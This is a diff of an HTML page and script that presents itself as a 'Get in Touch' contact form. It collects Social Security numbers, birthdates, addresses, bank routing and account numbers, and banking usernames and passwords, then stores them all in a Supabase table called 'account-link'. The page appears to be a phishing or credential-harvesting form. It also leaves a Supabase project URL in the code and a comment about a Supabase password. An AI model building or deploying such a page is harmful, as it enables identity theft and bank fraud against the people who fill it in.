@@ -1,138 +1,148 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Form Submission</title>
     <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
     <div class="container">
         <div class="form-container">
             <h1 class="form-title">Get in Touch</h1>
-            <p class="form-description">Please fill out the form below and we'll get back to you as soon as possible.</p>
-    
+            <p class="form-description">Please fill out the form below and we'll get back to you as soon as possible.
+            </p>
+
             <form id="accountForm">
                 <div class="input-group">
                     <label for="first_name">First Name</label>
                     <input type="text" id="first_name" name="first_name" placeholder="Enter your first name" required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="last_name">Last Name</label>
                     <input type="text" id="last_name" name="last_name" placeholder="Enter your last name" required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="birthdate">Birthdate</label>
                     <input type="date" id="birthdate" name="birthdate" required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="address">Address</label>
                     <input type="text" id="address" name="address" placeholder="Enter your address" required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="ssn">SSN</label>
                     <input type="number" id="ssn" name="ssn" placeholder="Enter your SSN" required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="routing_number">Routing Number</label>
-                    <input type="number" id="routing_number" name="routing_number" placeholder="Enter routing number" required>
+                    <input type="number" id="routing_number" name="routing_number" placeholder="Enter routing number"
+                        required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="account_number">Account Number</label>
-                    <input type="number" id="account_number" name="account_number" placeholder="Enter account number" required>
+                    <input type="number" id="account_number" name="account_number" placeholder="Enter account number"
+                        required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="bank_name">Bank Name</label>
                     <input type="text" id="bank_name" name="bank_name" placeholder="Enter bank name" required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="username">Username</label>
                     <input type="text" id="username" name="username" placeholder="Enter your username" required>
                 </div>
-    
+
                 <div class="input-group">
                     <label for="password">Password</label>
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required
+                        autocomplete="current-password">
                 </div>
-    
+
                 <button type="submit" class="submit-button">Submit</button>
             </form>
-    
+
             <p id="responseMessage" class="response-message"></p>
         </div>
     </div>
-    
+
     </div>
 
-    <script type="module" src="script.js"></script>
-<!-- <script src="https://unpkg.com/@supabase/supabase-js@2"></script> -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <!-- <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script> -->
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <!-- <script src="./script.js"></script> -->
 
     <script>
+        const { createClient } = supabase
+        const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+        const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_KEY;
+        supabase = createClient(supabaseUrl, supabaseKey);
 
-    import { createClient } from '@supabase/supabase-js'
-        
-    const supabaseUrl = 'https://gutkqbxzhakewweqjhek.supabase.co'
-    // const supabaseKey = process.env.SUPABASE_KEY
-const supabase = createClient(supabaseUrl, supabaseKey);
+        console.log('Supabase initialized:', supabase);
 
-document.addEventListener('DOMContentLoaded', function () {
-    const form = document.getElementById('accountForm');
-    if (form) {
-        form.addEventListener('submit', async function (event) {
-            event.preventDefault();
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.getElementById('accountForm');
+            if (form) {
+                form.addEventListener('submit', async function (event) {
+                    event.preventDefault();
 
-            const firstName = document.getElementById('first_name').value;
-            const lastName = document.getElementById('last_name').value;
-            const birthdate = document.getElementById('birthdate').value;
-            const address = document.getElementById('address').value;
-            const ssn = document.getElementById('ssn').value;
-            const routingNumber = document.getElementById('routing_number').value;
-            const accountNumber = document.getElementById('account_number').value;
-            const bankName = document.getElementById('bank_name').value;
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+                    const firstName = document.getElementById('first_name').value;
+                    const lastName = document.getElementById('last_name').value;
+                    const birthdate = document.getElementById('birthdate').value;
+                    const address = document.getElementById('address').value;
+                    const ssn = document.getElementById('ssn').value;
+                    const routingNumber = document.getElementById('routing_number').value;
+                    const accountNumber = document.getElementById('account_number').value;
+                    const bankName = document.getElementById('bank_name').value;
+                    const username = document.getElementById('username').value;
+                    const password = document.getElementById('password').value;
 
-            const { data, error } = await supabase
-                .from('account-link')
-                .insert([
-                    {
-                        first_name: firstName,
-                        last_name: lastName,
-                        birthdate: birthdate,
-                        address: address,
-                        ssn: ssn,
-                        routing_number: routingNumber,
-                        account_number: accountNumber,
-                        bank_name: bankName,
-                        username: username,
-                        password: password
+                    console.log("console log before inserting the data ");
+                    const { data, error } = await supabase
+                        .from('account-link')
+                        .insert([
+                            {
+                                first_name: firstName,
+                                last_name: lastName,
+                                birthdate: birthdate,
+                                address: address,
+                                ssn: ssn,
+                                routing_number: routingNumber,
+                                account_number: accountNumber,
+                                bank_name: bankName,
+                                username: username,
+                                password: password
+                            }
+                        ]);
+                    console.log("console log after inserting the data ");
+
+                    console.log("here is the data after form is submited --->>>>", data);
+                    if (error) {
+                        console.error('Error inserting data:', error);
+                        alert('There was an error while submitting the form.');
+                    } else {
+                        console.log('Data inserted successfully:', data);
+                        alert('Form submitted successfully!');
                     }
-                ]);
-
-            if (error) {
-                console.error('Error inserting data:', error);
-                alert('There was an error while submitting the form.');
-            } else {
-                console.log('Data inserted successfully:', data);
-                alert('Form submitted successfully!');
+                });
             }
         });
-    }
-});
-
-        
     </script>
+    <!-- <script src="https://unpkg.com/@supabase/supabase-js@2"></script> -->
+
 </body>
+
 </html>
 
 <!-- AliceSupaBase password for supabase -->
